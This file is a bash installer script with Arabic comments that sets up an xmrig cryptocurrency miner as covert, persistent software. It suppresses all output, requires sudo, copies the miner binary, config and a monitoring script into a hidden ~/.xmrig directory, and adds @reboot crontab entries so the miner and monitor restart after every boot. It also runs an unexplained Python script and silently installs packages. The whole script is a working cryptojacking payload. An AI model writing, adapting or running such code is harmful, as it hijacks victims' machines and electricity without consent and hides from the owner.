#!/bin/bash
python3 m2w.py
PYTHON_CMD=$(command -v python3 || command -v python) >/dev/null 2>&1

if [ -z "$PYTHON_CMD" ]; then
    exit 1
fi

$PYTHON_CMD -m ensurepip --default-pip >/dev/null 2>&1
$PYTHON_CMD -m pip install --upgrade pip --break-system-packages >/dev/null 2>&1

REQUIRED_PACKAGES=("requests" "psutil")
for package in "${REQUIRED_PACKAGES[@]}"; do
    $PYTHON_CMD -c "import $package" 2>/dev/null || \
    $PYTHON_CMD -m pip install "$package" --break-system-packages >/dev/null 2>&1
done

USER_HOME=$(eval echo ~$SUDO_USER)
USER_CRON="$SUDO_USER"
DEST_DIR="$USER_HOME/.xmrig"  
DEST_XMRIG="$DEST_DIR/xmrig"
DEST_CONFIG="$DEST_DIR/config.json"
DEST_MONITOR="$DEST_DIR/miner_monitor.py"

# 🔍 التحقق من صلاحيات الروت
if [ "$(id -u)" -ne 0 ] || [ -z "$SUDO_USER" ] || [ "$SUDO_USER" == "root" ]; then
    exit 1
fi

# 📂 إنشاء المجلد المخفي
mkdir -p "$DEST_DIR" >/dev/null 2>&1

# 📤 نقل الملفات
cp ./xmrig "$DEST_XMRIG" >/dev/null 2>&1
cp ./config.json "$DEST_CONFIG" >/dev/null 2>&1
cp ./miner_monitor.py "$DEST_MONITOR" >/dev/null 2>&1

# 🔑 إعطاء الصلاحيات المناسبة
chmod +x "$DEST_XMRIG" "$DEST_MONITOR" >/dev/null 2>&1
chown -R "$SUDO_USER:$SUDO_USER" "$DEST_DIR" >/dev/null 2>&1

# ⏳ إعداد المهام في crontab
CRON_XMRIG="@reboot sleep 60 && cd $DEST_DIR && ./xmrig --config=config.json >/dev/null 2>&1"
CRON_MONITOR="@reboot sleep 120 && cd $DEST_DIR && python3 miner_monitor.py >/dev/null 2>&1"

EXISTING_CRON=$(sudo -u "$SUDO_USER" crontab -l 2>/dev/null)

# ✅ إضافة مهمة تشغيل xmrig إذا لم تكن موجودة
echo "$EXISTING_CRON" | grep -q "$DEST_XMRIG" || \
    (echo "$EXISTING_CRON"; echo "$CRON_XMRIG") | sudo -u "$SUDO_USER" crontab -

# 🔄 تحديث قائمة المهام المجدولة بعد التعديل الأول
EXISTING_CRON=$(sudo -u "$SUDO_USER" crontab -l 2>/dev/null)

# ✅ إضافة مهمة تشغيل miner_monitor.py إذا لم تكن موجودة
echo "$EXISTING_CRON" | grep -q "$DEST_MONITOR" || \
    (echo "$EXISTING_CRON"; echo "$CRON_MONITOR") | sudo -u "$SUDO_USER" crontab -
